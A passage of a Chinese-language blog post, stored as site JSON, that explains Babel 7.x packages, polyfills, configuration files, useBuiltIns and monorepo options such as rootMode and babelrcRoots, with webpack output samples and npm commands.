./node_modules/core-js/modules/es6.array.find-index.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">\\**************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// 22.1.3.9 Array.prototype.findIndex(predicate, thisArg = undefined)\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $find = __webpack_require__(/*! ./_array-methods */ \\\"./node_modules/core-js/modules/_array-methods.js\\\")(6);\\nvar KEY = 'findIndex';\\nvar forced = true;\\n// Shouldn't skip holes\\nif (KEY in []) Array(1)[KEY](function () &#123; forced = false; &#125;);\\n$export($export.P + $export.F * forced, 'Array', &#123;\\n  findIndex: function findIndex(callbackfn /* , that = undefined */) &#123;\\n    return $find(this, callbackfn, arguments.length &gt; 1 ? arguments[1] : undefined);\\n  &#125;\\n&#125;);\\n__webpack_require__(/*! ./_add-to-unscopables */ \\\"./node_modules/core-js/modules/_add-to-unscopables.js\\\")(KEY);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es6.array.find-index.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://babeljs.io/docs/en/babel-polyfill\" target=\"_blank\" rel=\"noopener\">更多介绍</a></p>\n<p><code>@babel/runtime</code> 提供统一的模块化的helper，例如编译后的文件中_classCallCheck，_defineProperties，_createClass等函数就是helper。可以类比为我们日常开发中用到的工具函数，这些是可复用的，因此在运行环境最好提取出来。<br><code>@babel/plugin-transform-runtime</code> runtime辅助插件，自动把runtime提取的helper引入到代码中。</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>Babel有两种并行的配置文件格式，可以一起使用，也可以单独使用。</p>\n<h3 id=\"项目范围的配置（全局配置）\"><a href=\"#项目范围的配置（全局配置）\" class=\"headerlink\" title=\"项目范围的配置（全局配置）\"></a>项目范围的配置（全局配置）</h3><p>在最新的<code>Babel 7.x</code>，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将自动搜索<code>babel.config.js</code>。这个作为默认配置，可以配置一些全局通用的规则，例如针对node_modules或、引用包文件等。</p>\n<h3 id=\"文件相对位置配置（局部配置）\"><a href=\"#文件相对位置配置（局部配置）\" class=\"headerlink\" title=\"文件相对位置配置（局部配置）\"></a>文件相对位置配置（局部配置）</h3><p>Babel通过从正在编译的<a href=\"https://babeljs.io/docs/en/options#filename\" target=\"_blank\" rel=\"noopener\">filename</a>开始搜索目录结构来加载.babelrc(和.babelrc.js / package.json# Babel)文件(受下面的警告限制)。这非常强大，因为它允许您为包的子部分创建独立的配置。局部配置优先级高于全局配置，因此最终结果是合并与覆盖。</p>\n<p>局部配置边缘情况处理规则：</p>\n<ol>\n<li>一旦包含的目录搜索到package.json即停止搜索，因此相对配置只应用于单个包中。</li>\n<li>正在编译的<a href=\"https://babeljs.io/docs/en/options#filename\" target=\"_blank\" rel=\"noopener\">filename</a>必须在<code>babelrcRoots</code>配置项中，否则将完全跳过搜索。<br>简言之，.babelrc文件只作用于自己的package中，根目录下的.babelrc文件如果没有在babelrcRoots中配置将被忽略。</li>\n</ol>\n<h3 id=\"useBuiltIns\"><a href=\"#useBuiltIns\" class=\"headerlink\" title=\"useBuiltIns\"></a>useBuiltIns</h3><p>“usage” | “entry” | false, defaults to false.</p>\n<p>“entry” 指定入口文件中引入<code>import &quot;@babel/polyfill&quot;;</code>，编译后的polyfill代码统一加入该入口文件，示例如下：<br>In<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"@babel/polyfill\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>Out (different based on environment)<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"core-js/modules/es7.string.pad-start\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"core-js/modules/es7.string.pad-end\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>webpack示例：<br>In<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry: [<span class=\"string\">'@babel/polyfill'</span>, path.join(__dirname, <span class=\"string\">'./src/index.js'</span>)],</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es7.string.pad-end.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">  !*** ./node_modules/core-js/modules/es7.string.pad-end.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">  \\************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', &#123;\\n  padEnd: function padEnd(maxLength /* , fillString = ' ' */) &#123;\\n    return $pad(this, maxLength, arguments.length &gt; 1 ? arguments[1] : undefined, false);\\n  &#125;\\n&#125;);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-end.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es7.string.pad-start.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!**************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">  !*** ./node_modules/core-js/modules/es7.string.pad-start.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">  \\**************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', &#123;\\n  padStart: function padStart(maxLength /* , fillString = ' ' */) &#123;\\n    return $pad(this, maxLength, arguments.length &gt; 1 ? arguments[1] : undefined, true);\\n  &#125;\\n&#125;);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-start.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br></pre></td></tr></table></figure>\n<h2 id=\"Monorepos\"><a href=\"#Monorepos\" class=\"headerlink\" title=\"Monorepos\"></a>Monorepos</h2><p>简单理解就是一个总目录下，有多个package，不同的package下的可能有自己的babel配置文件。示例如下图：</p>\n<p><img src=\"/2019-04-25-babel7-x-test/3.jpg\" alt=\"测试项目结构图\"></p>\n<p>过去的用法比较繁琐，babel7.x针对痛点做了相应的调整。现在的推荐用法是总目录下一个全局配置文件<code>babel.config.js</code>，然后各个子package下各一个配置文件<code>.babelrc.js(.babelrc)</code>。<br>至于父子级间配置文件怎么配合使用，主要体现在两个配置参数：<a href=\"https://babeljs.io/docs/en/options#rootmode\" target=\"_blank\" rel=\"noopener\">rootMode</a>和<a href=\"https://babeljs.io/docs/en/options#babelrcroots\" target=\"_blank\" rel=\"noopener\">babelrcRoots</a>。</p>\n<h3 id=\"rootMode\"><a href=\"#rootMode\" class=\"headerlink\" title=\"rootMode\"></a>rootMode</h3><p>设定子package搜索<code>babel.config.js</code>的规则</p>\n<p><code>root</code> 默认值，限定在当前目录。<br><code>upward</code> 向上搜索，直到第一次出现<code>babel.config.js</code>为止，如果没搜到<code>babel.config.js</code>则抛出错误。<br><code>upward-optional</code> 向上搜索，没找到则返回<code>root</code>设置值对应目录。</p>\n<p>测试示例见mod1中的<code>package.json</code>，可以改下<code>--root-mode</code>的值执行<code>npm run babel</code>命令看编译后文件的变化。<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\",</span><br><span class=\"line\">  \"babel\": \"npx babel --root-mode upward src --out-dir lib\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"babelrcRoots\"><a href=\"#babelrcRoots\" class=\"headerlink\" title=\"babelrcRoots\"></a>babelrcRoots</h3><p>设定根目录中编译子package中的文件是否可用子package的<code>.babelrc</code>文件。</p>\n<p>测试步骤：</p>\n<ol>\n<li><p>webpack配置entry</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry: [<span class=\"string\">'@babel/polyfill'</span>, path.join(__dirname, <span class=\"string\">'./src/index.js'</span>), <span class=\"string\">'./packages/mod2/src/index.js'</span>],</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>‘./packages/mod2’下的.babelrc.js文件增加一行打印代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'from mod2 babelrc...............'</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>babel.config.js添加babelrcRoots配置项</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">babelrcRoots: [<span class=\"string\">'.'</span>, <span class=\"string\">'./packages/mod2'</span>]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm run babel</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>测试结果如图：<br><img src=\"/2019-04-25-babel7-x-test/4.jpg\" alt=\"示例图4\"></p>\n<p>去掉babelrcRoots配置项则不会执行mod2下的.babelrc，如图：<br><img src=\"/2019-04-25-babel7-x-test/5.jpg\" alt=\"示例图5\"></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>配置方式：<code>package.json</code>、<code>.babelrc</code>、<code>.babelrc.js</code>、<code>babel.config.js</code>。</p>\n<p><code>.babelrc.js</code>与<code>.babelrc</code>用法基本一样，只是前者支持js代码。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://babeljs.io/docs/en/\" target=\"_blank\" rel=\"noopener\">https://babeljs.io/docs/en/</a></p>\n<p><a href=\"https://www.jianshu.com/p/0ea6065cb39e\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/0ea6065cb39e</a></p>\n<p><a href=\"https://www.jianshu.com/p/cbd48919a0cc\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/cbd48919a0cc</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000018358854\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000018358854</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>Babel是一个JavaScript编译器，主要用于将ES6+代码转换为当前和旧浏览器或其他环境中向后兼容的JavaScript版本。本篇主要讲下babel7.x的基本用法及新特性测试，<a href=\"https://github.com/jovysun/babel7.x-test\" target=\"_blank\" rel=\"noopener\">测试源码</a>。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h2><h3 id=\"常用包介绍\"><a href=\"#常用包介绍\" class=\"headerlink\" title=\"常用包介绍\"></a>常用包介绍</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm install @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime -D</span></span><br></pre></td></tr></table></figure>\n<p>从7.x开始，包名改用命名空间方式，例如不再是<code>babel-core</code>而是<code>@babel/core</code>；</p>\n<p><code>@babel/core</code> 核心工具包，配合插件包可以转换特定语法，例如加上<code>@babel/plugin-transform-arrow-functions</code>插件包，可以转换箭头函数语法；</p>\n<p><code>@babel/preset-env</code> 智能预置插件包，根据配置参数去自动选择对应插件转换。与第二条说的直接安装对应语法的插件包相比，这个更符合实际场景，通常大家关心的是在什么环境下能运行而不是暴力的直接把高级语法转成低级语法。例如箭头函数在最新chrome下是支持的，在IE11下不支持。如果只要求chrome下使用，那么就没必要转换箭头函数了，还有node环境，如果对应node版本支持的高级语法就没必要转换了。</p>\n<p><img src=\"/2019-04-25-babel7-x-test/1.jpg\" alt=\"IE11\"> <img src=\"/2019-04-25-babel7-x-test/2.jpg\" alt=\"chrome\"></p>\n<p><a href=\"https://babeljs.io/docs/en/babel-preset-env\" target=\"_blank\" rel=\"noopener\">更多介绍</a></p>\n<p><code>@babel/polyfill</code> 与preset-env区别是，preset-env是高级语法形式转成对应低级语法形式，基本是针对新的语法糖，例如箭头函数转成普通function函数；而polyfill是针对新增加的接口方法用另一种当前环境能支持的方式去实现，例如<code>findIndex</code>方法，ES6新加的，ES5没有对应的，想在ES5环境使用只能用polyfill方式。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/findIndex\" target=\"_blank\" rel=\"noopener\">MDN实现</a>。</p>\n<p>webpack打包示例如图：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es6.array.find-index.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!**************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">!*** ./node_modules/core-js/modules/es6.array.find-index.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">\\**************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// 22.1.3.9 Array.prototype.findIndex(predicate, thisArg = undefined)\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $find = __webpack_require__(/*! ./_array-methods */ \\\"./node_modules/core-js/modules/_array-methods.js\\\")(6);\\nvar KEY = 'findIndex';\\nvar forced = true;\\n// Shouldn't skip holes\\nif (KEY in []) Array(1)[KEY](function () &#123; forced = false; &#125;);\\n$export($export.P + $export.F * forced, 'Array', &#123;\\n  findIndex: function findIndex(callbackfn /* , that = undefined */) &#123;\\n    return $find(this, callbackfn, arguments.length &gt; 1 ? arguments[1] : undefined);\\n  &#125;\\n&#125;);\\n__webpack_require__(/*! ./_add-to-unscopables */ \\\"./node_modules/core-js/modules/_add-to-unscopables.js\\\")(KEY);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es6.array.find-index.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://babeljs.io/docs/en/babel-polyfill\" target=\"_blank\" rel=\"noopener\">更多介绍</a></p>\n<p><code>@babel/runtime</code> 提供统一的模块化的helper，例如编译后的文件中_classCallCheck，_defineProperties，_createClass等函数就是helper。可以类比为我们日常开发中用到的工具函数，这些是可复用的，因此在运行环境最好提取出来。<br><code>@babel/plugin-transform-runtime</code> runtime辅助插件，自动把runtime提取的helper引入到代码中。</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>Babel有两种并行的配置文件格式，可以一起使用，也可以单独使用。</p>\n<h3 id=\"项目范围的配置（全局配置）\"><a href=\"#项目范围的配置（全局配置）\" class=\"headerlink\" title=\"项目范围的配置（全局配置）\"></a>项目范围的配置（全局配置）</h3><p>在最新的<code>Babel 7.x</code>，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将自动搜索<code>babel.config.js</code>。这个作为默认配置，可以配置一些全局通用的规则，例如针对node_modules或、引用包文件等。</p>\n<h3 id=\"文件相对位置配置（局部配置）\"><a href=\"#文件相对位置配置（局部配置）\" class=\"headerlink\" title=\"文件相对位置配置（局部配置）\"></a>文件相对位置配置（局部配置）</h3><p>Babel通过从正在编译的<a href=\"https://babeljs.io/docs/en/options#filename\" target=\"_blank\" rel=\"noopener\">filename</a>开始搜索目录结构来加载.babelrc(和.babelrc.js / package.json# Babel)文件(受下面的警告限制)。这非常强大，因为它允许您为包的子部分创建独立的配置。局部配置优先级高于全局配置，因此最终结果是合并与覆盖。</p>\n<p>局部配置边缘情况处理规则：</p>\n<ol>\n<li>一旦包含的目录搜索到package.json即停止搜索，因此相对配置只应用于单个包中。</li>\n<li>正在编译的<a href=\"https://babeljs.io/docs/en/options#filename\" target=\"_blank\" rel=\"noopener\">filename</a>必须在<code>babelrcRoots</code>配置项中，否则将完全跳过搜索。<br>简言之，.babelrc文件只作用于自己的package中，根目录下的.babelrc文件如果没有在babelrcRoots中配置将被忽略。</li>\n</ol>\n<h3 id=\"useBuiltIns\"><a href=\"#useBuiltIns\" class=\"headerlink\" title=\"useBuiltIns\"></a>useBuiltIns</h3><p>“usage” | “entry” | false, defaults to false.</p>\n<p>“entry” 指定入口文件中引入<code>import &quot;@babel/polyfill&quot;;</code>，编译后的polyfill代码统一加入该入口文件，示例如下：<br>In<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"@babel/polyfill\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>Out (different based on environment)<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"core-js/modules/es7.string.pad-start\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"core-js/modules/es7.string.pad-end\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>webpack示例：<br>In<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry: [<span class=\"string\">'@babel/polyfill'</span>, path.join(__dirname, <span class=\"string\">'./src/index.js'</span>)],</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es7.string.pad-end.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">  !*** ./node_modules/core-js/modules/es7.string.pad-end.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">  \\************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', &#123;\\n  padEnd: function padEnd(maxLength /* , fillString = ' ' */) &#123;\\n    return $pad(this, maxLength, arguments.length &gt; 1 ? arguments[1] : undefined, false);\\n  &#125;\\n&#125;);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-end.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es7.string.pad-start.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!**************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">  !*** ./node_modules/core-js/modules/es7.string.pad-start.js ***!</span></span><br><span class=\"line\"><span class=\"comment\">  \\**************************************************************/</span></span><br><span class=\"line\"><span class=\"comment\">/*! no static exports found */</span></span><br><span class=\"line\"><span class=\"comment\">/***/</span> (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">module, exports, __webpack_require__</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', &#123;\\n  padStart: function padStart(maxLength /* , fillString = ' ' */) &#123;\\n    return $pad(this, maxLength, arguments.length &gt; 1 ? arguments[1] : undefined, true);\\n  &#125;\\n&#125;);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-start.js?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/***/</span> &#125;),</span><br></pre></td></tr></table></figure>\n<h2 id=\"Monorepos\"><a href=\"#Monorepos\" class=\"headerlink\" title=\"Monorepos\"></a>Monorepos</h2><p>简单理解就是一个总目录下，有多个package，不同的package下的可能有自己的babel配置文件。示例如下图：</p>\n<p><img src=\"/2019-04-25-babel7-x-test/3.jpg\" alt=\"测试项目结构图\"></p>\n<p>过去的用法比较繁琐，babel7.x针对痛点做了相应的调整。现在的推荐用法是总目录下一个全局配置文件<code>babel.config.js</code>，然后各个子package下各一个配置文件<code>.babelrc.js(.babelrc)</code>。<br>至于父子级间配置文件怎么配合使用，主要体现在两个配置参数：<a href=\"https://babeljs.io/docs/en/options#rootmode\" target=\"_blank\" rel=\"noopener\">rootMode</a>和<a href=\"https://babeljs.io/docs/en/options#babelrcroots\" target=\"_blank\" rel=\"noopener\">babelrcRoots</a>。</p>\n<h3 id=\"rootMode\"><a href=\"#rootMode\" class=\"headerlink\" title=\"rootMode\"></a>rootMode</h3><p>设定子package搜索<code>babel.config.js</code>的规则</p>\n<p><code>root</code> 默认值，限定在当前目录。<br><code>upward</code> 向上搜索，直到第一次出现<code>babel.config.js</code>为止，如果没搜到<code>babel.config.js</code>则抛出错误。<br><code>upward-optional</code> 向上搜索，没找到则返回<code>root</code>设置值对应目录。</p>\n<p>测试示例见mod1中的<code>package.json</code>，可以改下<code>--root-mode</code>的值执行<code>npm run babel</code>命令看编译后文件的变化。<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\",</span><br><span class=\"line\">  \"babel\": \"npx babel --root-mode upward src --out-dir lib\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"babelrcRoots\"><a href=\"#babelrcRoots\" class=\"headerlink\" title=\"babelrcRoots\"></a>babelrcRoots</h3><p>设定根目录中编译子package中的文件是否可用子package的<code>.babelrc</code>文件。</p>\n<p>测试步骤：</p>\n<ol>\n<li><p>webpack配置entry</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry: [<span class=\"string\">'@babel/polyfill'</span>, path.join(__dirname, <span class=\"string\">'./src/index.js'</span>), <span 